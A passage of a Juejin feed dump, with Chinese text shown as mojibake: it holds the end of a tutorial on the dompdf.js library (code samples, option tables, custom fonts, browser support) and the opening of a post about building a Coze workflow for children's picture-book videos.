      <span class="hljs-attr">padding</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],
    },
    <span class="hljs-attr">footer</span>: {
      <span class="hljs-attr">content</span>: <span class="hljs-string">"ç¬¬${currentPage}é¡µ/å…±${totalPages}é¡µ"</span>,
      <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
      <span class="hljs-attr">contentColor</span>: <span class="hljs-string">"#333333"</span>,
      <span class="hljs-attr">contentFontSize</span>: <span class="hljs-number">12</span>,
      <span class="hljs-attr">contentPosition</span>: <span class="hljs-string">"center"</span>,
      <span class="hljs-attr">padding</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],
    },
  },
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">blob</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> url = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);
    <span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
    a.<span class="hljs-property">href</span> = url;
    a.<span class="hljs-property">download</span> = <span class="hljs-string">"example.pdf"</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
    a.<span class="hljs-title function_">click</span>();
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  });
</code></pre>
<h5 data-id="heading-15">æ›´ç²¾å‡†çš„åˆ†é¡µæ§åˆ¶-<code>divisionDisable</code> å±æ€§</h5>
<p>å¦‚æœæ‚¨ä¸å¸Œæœ›æŸä¸ªå®¹å™¨åœ¨åˆ†é¡µæ—¶è¢«æ‹†åˆ†æ—¶ï¼Œä¸ºè¯¥å…ƒç´ æ·»åŠ  <code>divisionDisable</code> å±æ€§ï¼Œè·¨é¡µæ—¶å®ƒä¼šæ•´ä½“ç§»è‡³ä¸‹ä¸€é¡µã€‚</p>
<pre><code class="hljs language-html" lang="html"> <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">""</span>
  <span class="hljs-attr">alt</span>=<span class="hljs-string">"PDF Generation Example"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
  <span class="hljs-attr">divisionDisable</span>
/&gt;</span>
</code></pre>
<p>å³è¾¹ä¸ºä½¿ç”¨divisionDisableå±æ€§çš„æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20956c6ce960489395b4432ffcbe58cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=fQqVhnOaHUPFywIzV9E3E01ss8o%3D" alt="ä¸åˆ†å‰²çš„æ•ˆæœ.png" loading="lazy"/></p>
<h4 data-id="heading-16">options å‚æ•°</h4>


















































































<table><thead><tr><th>å‚æ•°å</th><th>å¿…ä¼ </th><th>é»˜è®¤å€¼</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>useCORS</code></td><td>å¦</td><td><code>false</code></td><td><code>boolean</code></td><td>å…è®¸è·¨åŸŸèµ„æºï¼ˆéœ€æœåŠ¡ç«¯ CORS é…ç½®ï¼‰</td></tr><tr><td><code>backgroundColor</code></td><td>å¦</td><td>è‡ªåŠ¨è§£æ/ç™½è‰²</td><td><code>string | null</code></td><td>è¦†ç›–é¡µé¢èƒŒæ™¯è‰²ï¼›ä¼  <code>null</code> ç”Ÿæˆé€æ˜èƒŒæ™¯</td></tr><tr><td><code>fontConfig</code></td><td>å¦</td><td>-</td><td><code>object</code></td><td>éè‹±æ–‡å­—ä½“é…ç½®ï¼Œè§ä¸‹è¡¨</td></tr><tr><td><code>encryption</code></td><td>å¦</td><td>ç©ºé…ç½®</td><td><code>object</code></td><td>PDF åŠ å¯†é…ç½®ï¼Œå±æ€§<code>userPassword</code> ç”¨äºç»™å®šæƒé™åˆ—è¡¨ä¸‹ç”¨æˆ·çš„å¯†ç ï¼›å±æ€§<code>ownerPassword</code> éœ€è¦è®¾ç½® userPassword å’Œ ownerPassword ä»¥è¿›è¡Œæ­£ç¡®çš„èº«ä»½éªŒè¯ï¼›å±æ€§<code>userPermissions</code> ç”¨äºæŒ‡å®šç”¨æˆ·æƒé™ï¼Œå¯é€‰å€¼ä¸º <code>['print', 'modify', 'copy', 'annot-forms']</code></td></tr><tr><td><code>precision</code></td><td>å¦</td><td><code>16</code></td><td><code>number</code></td><td>å…ƒç´ ä½ç½®çš„ç²¾åº¦</td></tr><tr><td><code>compress</code></td><td>å¦</td><td><code>false</code></td><td><code>boolean</code></td><td>æ˜¯å¦å‹ç¼©æ˜¯å¦å‹ç¼© PDF</td></tr><tr><td><code>putOnlyUsedFonts</code></td><td>å¦</td><td><code>false</code></td><td><code>boolean</code></td><td>ä»…å°†å®é™…ä½¿ç”¨çš„å­—ä½“åµŒå…¥ PDF</td></tr><tr><td><code>pagination</code></td><td>å¦</td><td><code>false</code></td><td><code>boolean</code></td><td>å¼€å¯åˆ†é¡µæ¸²æŸ“</td></tr><tr><td><code>format</code></td><td>å¦</td><td><code>'a4'</code></td><td><code>string</code></td><td>é¡µé¢è§„æ ¼ï¼Œæ”¯æŒ <code>a0â€“a10</code>ã€<code>b0â€“b10</code>ã€<code>c0â€“c10</code>ã€<code>letter</code> ç­‰</td></tr><tr><td><code>pageConfig</code></td><td>å¦</td><td>è§ä¸‹è¡¨</td><td><code>object</code></td><td>é¡µçœ‰é¡µè„šé…ç½®</td></tr></tbody></table>
<h5 data-id="heading-17"><code>pageConfig</code>å­—æ®µï¼š</h5>























<table><thead><tr><th>å‚æ•°å</th><th>é»˜è®¤å€¼</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>header</code></td><td>è§ä¸‹è¡¨ pageConfigOptions</td><td>object</td><td>é¡µçœ‰è®¾ç½®</td></tr><tr><td><code>footer</code></td><td>è§ä¸‹è¡¨ pageConfigOptions</td><td>object</td><td>é¡µè„šè®¾ç½®</td></tr></tbody></table>
<h5 data-id="heading-18"><code>pageConfigOptions</code> å­—æ®µï¼š</h5>















































<table><thead><tr><th>å‚æ•°å</th><th>é»˜è®¤å€¼</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>content</code></td><td>é¡µçœ‰é»˜è®¤å€¼ä¸ºç©º,é¡µè„šé»˜è®¤å€¼ä¸º<code>${currentPage}/${totalPages}</code></td><td><code>string</code></td><td>æ–‡æœ¬å†…å®¹ï¼Œæ”¯æŒ <code>${currentPage}</code>ã€<code>${totalPages}</code>ï¼Œ<code>${currentPage}</code>ä¸ºå½“å‰é¡µç ï¼Œ<code>${totalPages}</code>ä¸ºæ€»é¡µç </td></tr><tr><td><code>height</code></td><td><code>50</code></td><td><code>number</code></td><td>åŒºåŸŸé«˜åº¦ï¼ˆpxï¼‰</td></tr><tr><td><code>contentPosition</code></td><td><code>'center'</code></td><td><code>string | [number, number]</code></td><td>æ–‡æœ¬ä½ç½®æšä¸¾ <code>center</code>ã€<code>centerLeft</code> ã€ <code>centerRight</code>ã€<code>centerTop</code>ã€ <code>centerBottom</code>ã€<code>leftTop</code>ã€ <code>leftBottom</code>ã€<code>rightTop</code>ã€<code>rightBottom</code>æˆ–åæ ‡ <code>[x,y]</code></td></tr><tr><td><code>contentColor</code></td><td><code>'#333333'</code></td><td><code>string</code></td><td>æ–‡æœ¬é¢œè‰²</td></tr><tr><td><code>contentFontSize</code></td><td><code>16</code></td><td><code>number</code></td><td>æ–‡æœ¬å­—å·ï¼ˆpxï¼‰</td></tr><tr><td><code>padding</code></td><td><code>[0,24,0,24]</code></td><td><code>[number, number, number, number]</code></td><td>ä¸Š/å³/ä¸‹/å·¦å†…è¾¹è·ï¼ˆpxï¼‰</td></tr></tbody></table>
<h5 data-id="heading-19">å­—ä½“é…ç½®ï¼ˆ<code>fontConfig</code>ï¼‰å­—æ®µï¼š</h5>


























<table><thead><tr><th>å­—æ®µ</th><th>å¿…ä¼ </th><th>é»˜è®¤å€¼</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>fontFamily</code></td><td>æ˜¯ï¼ˆå¯ç”¨è‡ªå®šä¹‰å­—ä½“æ—¶ï¼‰</td><td><code>''</code></td><td><code>string</code></td><td>å­—ä½“å®¶æ—åï¼ˆä¸æ³¨å…¥çš„ <code>.ttf</code> åŒåï¼‰</td></tr><tr><td><code>fontBase64</code></td><td>æ˜¯ï¼ˆå¯ç”¨è‡ªå®šä¹‰å­—ä½“æ—¶ï¼‰</td><td><code>''</code></td><td><code>string</code></td><td><code>.ttf</code> çš„ Base64 å­—ç¬¦ä¸²å†…å®¹</td></tr></tbody></table>
<h4 data-id="heading-20">ä¹±ç é—®é¢˜-å­—ä½“å¯¼å…¥æ”¯æŒ</h4>
<p>ç”±äº jspdf åªæ”¯æŒè‹±æ–‡ï¼Œæ‰€ä»¥å…¶ä»–è¯­è¨€ä¼šå‡ºç°ä¹±ç çš„é—®é¢˜ï¼Œéœ€è¦å¯¼å…¥å¯¹åº”çš„å­—ä½“æ–‡ä»¶æ¥è§£å†³ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰å­—ä½“ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Frawgit.com%2FMrRio%2FjsPDF%2Fmaster%2Ffontconverter%2Ffontconverter.html" target="_blank" title="https://rawgit.com/MrRio/jsPDF/master/fontconverter/fontconverter.html" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>å°†å­—ä½“ tff æ–‡ä»¶è½¬åŒ–æˆ base64 æ ¼å¼çš„ js æ–‡ä»¶ï¼Œä¸­æ–‡å­—ä½“æ¨èä½¿ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flmn1919%2Fdompdf.js%2Fblob%2Fmain%2Fexamples%2FSourceHanSansSC-Normal-Min-normal.js" target="_blank" title="https://github.com/lmn1919/dompdf.js/blob/main/examples/SourceHanSansSC-Normal-Min-normal.js" ref="nofollow noopener noreferrer">æ€æºé»‘ä½“</a>,ä½“ç§¯è¾ƒå°ã€‚
åœ¨ä»£ç ä¸­å¼•å…¥è¯¥æ–‡ä»¶å³å¯ã€‚</p>
<pre><code class="hljs language-js" lang="js">&lt;script type=<span class="hljs-string">"text/javascript"</span> src=<span class="hljs-string">"./SourceHanSansSC-Normal-Min-normal.js"</span>&gt;&lt;/script&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-title function_">dompdf</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#capture'</span>), {
    <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">fontConfig</span>: {
      <span class="hljs-attr">fontFamily</span>: <span class="hljs-string">'SourceHanSansSC-Normal-Min'</span>,
      <span class="hljs-attr">fontBase64</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">fontBase64</span>
    }
  })
    .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">blob</span>) {
      <span class="hljs-keyword">const</span> url = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);
      <span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);
      a.<span class="hljs-property">href</span> = url;
      a.<span class="hljs-property">download</span> = <span class="hljs-string">'example.pdf'</span>;
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
      a.<span class="hljs-title function_">click</span>();
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
    });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-21">ç»˜åˆ¶æ¸å˜è‰²ã€é˜´å½±ç­‰å¤æ‚æ ·å¼-foreignObjectRendering ä½¿ç”¨</h4>
<p>åœ¨ dom ååˆ†å¤æ‚ï¼Œæˆ–è€… pdf æ— æ³•ç»˜åˆ¶çš„æƒ…å†µï¼ˆæ¯”å¦‚ï¼šå¤æ‚çš„è¡¨æ ¼ï¼Œè¾¹æ¡†é˜´å½±ï¼Œæ¸å˜ç­‰ï¼‰ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ foreignObjectRenderingã€‚
ç»™è¦æ¸²æŸ“çš„å…ƒç´ æ·»åŠ  foreignObjectRendering å±æ€§ï¼Œå°±å¯ä»¥é€šè¿‡ svg çš„ foreignObject å°†å®ƒæ¸²æŸ“æˆä¸€å¼ èƒŒæ™¯å›¾æ’å…¥åˆ° pdf æ–‡ä»¶ä¸­ã€‚</p>
<p>ä½†æ˜¯ï¼Œç”±äº foreignObject å…ƒç´ çš„æ¸²æŸ“ä¾èµ–äºæµè§ˆå™¨çš„å®ç°ï¼Œå› æ­¤åœ¨ä¸åŒçš„æµè§ˆå™¨ä¸­å¯èƒ½ä¼šæœ‰ä¸åŒçš„è¡¨ç°ã€‚
æ‰€ä»¥ï¼Œåœ¨ä½¿ç”¨ foreignObjectRendering æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹äº‹é¡¹ï¼š</p>
<ol>
<li>foreignObject å…ƒç´ çš„æ¸²æŸ“ä¾èµ–äºæµè§ˆå™¨çš„å®ç°ï¼Œå› æ­¤åœ¨ä¸åŒçš„æµè§ˆå™¨ä¸­å¯èƒ½ä¼šæœ‰ä¸åŒçš„è¡¨ç°ã€‚</li>
<li>IE æµè§ˆå™¨å®Œå…¨ä¸æ”¯æŒï¼Œæ¨èåœ¨ chrome å’Œ firefox,edge ä¸­ä½¿ç”¨ã€‚</li>
<li>ç”Ÿæˆçš„å›¾ç‰‡ä¼šå¯¼è‡´ pdf æ–‡ä»¶ä½“ç§¯å˜å¤§ã€‚</li>
</ol>
<p>ç¤ºä¾‹</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 100px;height: 100px;"</span> <span class="hljs-attr">foreignObjectRendering</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
    <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 50px;height: 50px;border: 1px solid #000;box-shadow: 2px 2px 5px rgba(0,0,0,0.3);background: linear-gradient(45deg, #ff6b6b, #4ecdc4);"</span>
  &gt;</span>
    è¿™æ˜¯ä¸€ä¸ªdivå…ƒç´ 
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-22">æµè§ˆå™¨å…¼å®¹æ€§</h3>
<p>è¯¥åº“åº”è¯¥å¯ä»¥åœ¨ä»¥ä¸‹æµè§ˆå™¨ä¸Šæ­£å¸¸å·¥ä½œï¼ˆéœ€è¦ <code>Promise</code> polyfillï¼‰ï¼š</p>
<ul>
<li>Firefox 3.5+</li>
<li>Google Chrome</li>
<li>Opera 12+</li>
<li>IE9+</li>
<li>Safari 6+</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»å›¾æ–‡åˆ°è§†é¢‘ï¼Œå¦‚ä½•ç”¨Cozeè·‘é€šâ€œå°çº¢ä¹¦å„¿ç«¥ç»˜æœ¬â€çš„å•†ä¸šé—­ç¯ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7584094504630910985</link>    <guid>https://juejin.cn/post/7584094504630910985</guid>    <pubDate>2025-12-16T05:57:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584094504630910985" data-draft-id="7584028251166507035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»å›¾æ–‡åˆ°è§†é¢‘ï¼Œå¦‚ä½•ç”¨Cozeè·‘é€šâ€œå°çº¢ä¹¦å„¿ç«¥ç»˜æœ¬â€çš„å•†ä¸šé—­ç¯ï¼Ÿ"/> <meta itemprop="keywords" content="Coze,AIGC,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-16T05:57:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åç«¯å°è‚¥è‚ "/> <meta itemprop="url" content="https://juejin.cn/user/2966945320667536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»å›¾æ–‡åˆ°è§†é¢‘ï¼Œå¦‚ä½•ç”¨Cozeè·‘é€šâ€œå°çº¢ä¹¦å„¿ç«¥ç»˜æœ¬â€çš„å•†ä¸šé—­ç¯ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2966945320667536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åç«¯å°è‚¥è‚ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:57:47.000Z" title="Tue Dec 16 2025 05:57:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°è‚¥è‚ ï¼ä¸Šå‘¨çš„å„¿ç«¥ç»˜æœ¬å›¾æ–‡æ•™ç¨‹å¤§å®¶åå“çƒ­çƒˆï¼Œä½†æˆ‘ä¹Ÿå¬åˆ°äº†å¤§å®¶çš„å‘¼å£°ï¼š<strong>è§†é¢‘æ‰æ˜¯ç°åœ¨çš„æµé‡å¯†ç ï¼</strong> æ²¡é—®é¢˜ï¼Œä»Šå¤©ç›´æ¥å®‰æ’ï¼æœ¬æœŸæ•™ç¨‹æ•™ä½ ç”¨ <strong>Coze + Nano Banana</strong> <strong>Pro</strong> æ­å»ºå…¨è‡ªåŠ¨<strong>è§†é¢‘ç»˜æœ¬</strong> <strong>å·¥ä½œæµ</strong>ã€‚ä»åˆ›æ„åˆ°æˆå“ï¼Œå‡ åˆ†é’Ÿå†…æå®šã€‚æƒ³åœ¨å°çº¢ä¹¦è§†é¢‘èµ›é“åˆ†ä¸€æ¯ç¾¹çš„æœ‹å‹ï¼Œè¿™ç¯‡å¹²è´§åƒä¸‡åˆ«é”™è¿‡ï¼Œè·Ÿç»ƒèµ°èµ·~</p>
<h2 data-id="heading-0">1. ä¸ºä»€ä¹ˆè¦åšè§†é¢‘ç»˜æœ¬ï¼Ÿ</h2>
<p>ä¸Šå‘¨æˆ‘åšäº†ä¸€ä¸ªå„¿ç«¥ç»˜æœ¬å·¥ä½œæµ<a href="https://juejin.cn/post/7581415427516416042" target="_blank" title="https://juejin.cn/post/7581415427516416042">å°çº¢ä¹¦å„¿ç«¥ç»˜æœ¬è¿™æ ·åšï¼Coze+Nano Banana Proæ‰¹é‡ç”Ÿäº§æŒ‚æ©±çª—</a>ï¼Œç¤¾ç¾¤å°ä¼™ä¼´åå“çƒ­çƒˆï¼Œæˆ‘ä»¬ä¹Ÿé¡ºåŠ¿å¼€å¯äº†å„¿ç«¥ç»˜æœ¬å®æˆ˜è®­ç»ƒè¥ã€‚åœ¨é™ªè·‘çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘æ•é”åœ°å‘ç°äº†ä¸€ä¸ªæ›´å…·æ½œåŠ›çš„é£å£ï¼š<strong>åŠ¨èµ·æ¥çš„ç»˜æœ¬</strong>ã€‚åœ¨è®¸å¤šé«˜çƒ­åº¦çš„ç»˜æœ¬ç¬”è®°è¯„è®ºåŒºï¼Œæˆ‘å‘ç°å¤§é‡å®¶é•¿éƒ½åœ¨æ±‚è§†é¢‘ç‰ˆèµ„æºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d46f490c255b4722bedd53991c276e19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=ZTZsKOh3N3pwWo8lkNehmvSSgGI%3D" alt="" loading="lazy"/></p>
<p>æˆ‘å»è°ƒç ”äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™ç±»è§†é¢‘ä¸ä»…æ¶µç›–ä¸­è‹±æ–‡ï¼Œè€Œä¸”çƒ­åº¦æé«˜ã€‚ç›¸æ¯”äºæ™®é€šå›¾æ–‡ï¼Œè§†é¢‘ç»˜æœ¬çš„å®Œæ’­ç‡å’Œäº’åŠ¨æ•°æ®ç®€ç›´æ˜¯é™ç»´æ‰“å‡»ï¼Œç‚¹èµé‡è½»æ¾ç ´ä¸‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9ebfd4832b14c85a670905bfa1724ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=iFUbZvuntYpawtMerBoammSE%2FI8%3D" alt="" loading="lazy"/></p>
